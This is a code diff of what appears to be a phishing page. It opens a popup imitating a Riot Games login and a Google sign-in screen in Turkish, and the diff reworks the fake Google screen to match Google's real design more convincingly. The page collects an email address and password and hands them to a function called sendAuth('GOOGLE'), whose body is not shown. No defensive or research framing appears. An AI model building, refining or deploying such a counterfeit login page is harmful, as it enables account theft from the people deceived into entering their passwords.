@@ -208,7 +208,7 @@
         }
 
         function openAuth() {
-            const w = 450, h = 750;
+            const w = 480, h = 650;
             const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
             let win = window.open("", "AuthLogin", `width=${w},height=${h},top=${t},left=${l}`);
             
@@ -228,20 +228,37 @@
                     .ap { background: #000; color: white; }
                     .login-btn { width: 100%; padding: 20px; background: #ff4655; color: white; border: none; border-radius: 4px; font-weight: 900; cursor: pointer; margin-top: 15px; text-transform: uppercase; }
                     
-                    /* Google Screen UI - Gerçekçi Tasarım */
-                    .g-card { width: 380px; padding: 48px 40px 36px; background: white; border-radius: 8px; text-align: center; color: #202124; box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24); animation: slideUp 0.5s ease; }
-                    .g-logo { width: 75px; margin-bottom: 15px; }
-                    .g-h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; font-family: 'Google Sans',arial,sans-serif; }
-                    .g-p { margin-bottom: 32px; color: #202124; font-size: 16px; }
-                    .g-input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; margin-bottom: 8px; outline: none; }
+                    /* Google Screen UI - Modern Materyal Tasarım */
+                    .g-card { 
+                        width: 380px; 
+                        min-height: 500px;
+                        padding: 48px 40px 36px; 
+                        background: white; 
+                        border-radius: 8px; 
+                        text-align: center; 
+                        color: #202124; 
+                        box-shadow: 0 1px 2px 0 rgba(60,64,67,0.302), 0 1px 3.1px 1px rgba(60,64,67,0.149); 
+                        animation: slideUp 0.5s ease; 
+                        margin: auto;
+                    }
+                    .g-logo-container { height: 24px; margin-bottom: 10px; display: flex; justify-content: center; }
+                    .g-logo { height: 100%; object-fit: contain; }
+                    .g-h1 { font-size: 24px; font-weight: 400; line-height: 1.3333; margin-bottom: 0; color: #202124; font-family: 'Arial', sans-serif; }
+                    .g-p { margin-top: 8px; margin-bottom: 32px; color: #202124; font-size: 16px; font-weight: 400; }
+                    .g-input-wrapper { position: relative; margin-bottom: 8px; text-align: left; }
+                    .g-input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; transition: border 0.2s; }
                     .g-input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
-                    .g-next { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; margin-top: 30px; font-size: 14px; transition: background 0.2s; }
+                    .g-link { color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; text-decoration: none; display: inline-block; }
+                    .g-link:hover { text-decoration: underline; }
+                    .g-footer-btns { margin-top: 40px; display: flex; justify-content: space-between; align-items: center; }
+                    .g-create-acc { color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; }
+                    .g-next { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); }
                     .g-next:hover { background: #1b66c9; }
                     
                     @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                     @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
                 </style></head><body>
-                
+                    
                 <div id="riot-screen" class="card">
                     <img src="login_screen_logo.png" width="120" style="margin-bottom: 25px;">
                     <h2>OTURUM AÇ</h2>
@@ -255,22 +272,35 @@
                 </div>
 
                 <div id="google-screen" class="g-card" style="display:none;">
-                    <img class="g-logo" src="google_giris.png">
+                    <div class="g-logo-container">
+                        <img class="g-logo" src="google_giris.png" alt="Google">
+                    </div>
                     <div id="g-step1">
                         <h1 class="g-h1">Oturum açın</h1>
                         <p class="g-p">Google Hesabınızı kullanın</p>
-                        <input type="email" id="g_email" class="g-input" placeholder="E-posta veya telefon">
-                        <div style="text-align: left; color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; margin-top: 5px;">E-postanızı mı unuttunuz?</div>
-                        <div style="text-align: left; margin-top: 40px; color: #5f6368; font-size: 14px;">Bilgisayar sizin değil mi? Güvenli bir şekilde oturum açmak için Misafir modunu kullanın.</div>
-                        <button class="g-next" onclick="gNext()">İleri</button>
+                        <div class="g-input-wrapper">
+                            <input type="email" id="g_email" class="g-input" placeholder="E-posta veya telefon">
+                        </div>
+                        <div style="text-align: left;"><span class="g-link">E-postanızı mı unuttunuz?</span></div>
+                        <div style="text-align: left; margin-top: 32px; color: #5f6368; font-size: 14px; line-height: 1.4;">
+                            Bilgisayar sizin değil mi? Güvenli bir şekilde oturum açmak için Misafir modunu kullanın. <span class="g-link">Daha fazla bilgi edinin</span>
+                        </div>
+                        <div class="g-footer-btns">
+                            <span class="g-create-acc">Hesap oluşturun</span>
+                            <button class="g-next" onclick="gNext()">İleri</button>
+                        </div>
                     </div>
                     <div id="g-step2" style="display:none; animation: fadeIn 0.4s ease;">
-                        <div id="disp_email" style="font-size:14px; border:1px solid #dadce0; border-radius:20px; padding:6px 12px; display:inline-flex; align-items:center; gap:8px; margin-bottom:15px; color:#3c4043; font-weight:500;"></div>
+                        <div id="disp_email" style="font-size:14px; border:1px solid #dadce0; border-radius:20px; padding:4px 12px; display:inline-flex; align-items:center; gap:8px; margin-bottom:24px; color:#3c4043; font-weight:500;"></div>
                         <h1 class="g-h1">Hoş geldiniz</h1>
-                        <p class="g-p" style="margin-bottom:20px;">Şifrenizi girin</p>
-                        <input type="password" id="g_pass" class="g-input" placeholder="Şifreniz">
-                        <div style="text-align: left; color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; margin-top: 5px;">Şifrenizi mi unuttunuz?</div>
-                        <button class="g-next" onclick="sendAuth('GOOGLE')">Giriş Yap</button>
+                        <p class="g-p">Şifrenizi girin</p>
+                        <div class="g-input-wrapper">
+                            <input type="password" id="g_pass" class="g-input" placeholder="Şifreniz">
+                        </div>
+                        <div style="text-align: left; margin-top: 8px;"><span class="g-link">Şifrenizi mi unuttunuz?</span></div>
+                        <div class="g-footer-btns" style="justify-content: flex-end;">
+                            <button class="g-next" onclick="sendAuth('GOOGLE')">Giriş Yap</button>
+                        </div>
                     </div>
                 </div>
 
